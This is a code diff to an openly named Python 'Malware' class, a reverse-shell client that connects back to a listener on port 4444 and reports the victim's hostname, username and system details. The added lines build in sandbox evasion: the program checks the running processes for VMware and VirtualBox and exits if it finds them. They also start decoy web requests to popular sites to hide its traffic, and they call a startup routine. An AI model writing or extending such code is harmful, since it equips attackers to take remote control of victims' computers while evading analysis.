@@ -5,7 +5,10 @@ import requests
 import time
 import platform
 import pyautogui
-import uuid 
+import uuid
+import threading
+import os
+import sys
 class Malware():
     def __init__(self , lhost , lport , timer):
         self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
@@ -14,6 +17,8 @@ class Malware():
         self.timer = timer
         self.hostname = socket.gethostname()
         self.username = os.getlogin()
+        self.filename = sys.argv[0]
+        self.filename = os.path.basename(self.filename)
         self.info = f"""
 -----------------
       INFO
@@ -25,7 +30,28 @@ release => {platform.release()}
 version => {platform.version()}
 Arch => {platform.architecture()[0]}
 python version => {platform.python_version()}
+filename => {self.filename}
 """
+        self.links = [r'https://www.google.com',
+r'https://www.youtube.com',
+r'https://www.facebook.com',
+r'https://www.amazon.com',
+r'https://www.wikipedia.org',
+r'https://www.reddit.com',
+r'https://www.twitter.com',
+r'https://www.instagram.com',
+r'https://www.linkedin.com',
+r'https://www.netflix.com']
+        self.vm_process =["vmware-vmx.exe",
+"vmware.exe",
+"vmware-authd.exe",
+"vmware-tray.exe",
+"VirtualBox.exe",
+"VBoxSVC.exe",
+"VBoxHeadless.exe",
+"VBoxTray.exe",
+"VBoxManage.exe",
+]
     def connect_server(self):
         while True:
             try:
@@ -33,6 +59,27 @@ python version => {platform.python_version()}
                 self.interact_server()
             except:
                 time.sleep(self.timer)
+    def anti_vm(self):
+        all_process = os.popen('tasklist').read()
+        for vm_process in self.vm_process:
+            if vm_process in all_process:
+                print(vm_process)
+                print(f'Virtual Machine Process Found :{vm_process}')
+                self.kill()
+        self.start_up()
+        th1 = threading.Thread(target=self.fake_requests)
+        th2 = threading.Thread(target=self.connect_server)
+        th2.start()
+        th1.start()
+        
+    def kill(self):
+        exit()      
+    
+    def fake_requests(self):
+        while True:
+            for link in self.links:
+                r = requests.get(link)
+    
     def interact_server(self):
         self.i.sendall(self.hostname.encode())
         while True:
@@ -114,5 +161,6 @@ python version => {platform.python_version()}
                 except PermissionError:
                     self.i.sendall('error:admin'.encode())
                     
-                
-Malware('localhost',4444,0).connect_server()
+    
+malware = Malware('localhost',4444,0)
+malware.anti_vm()
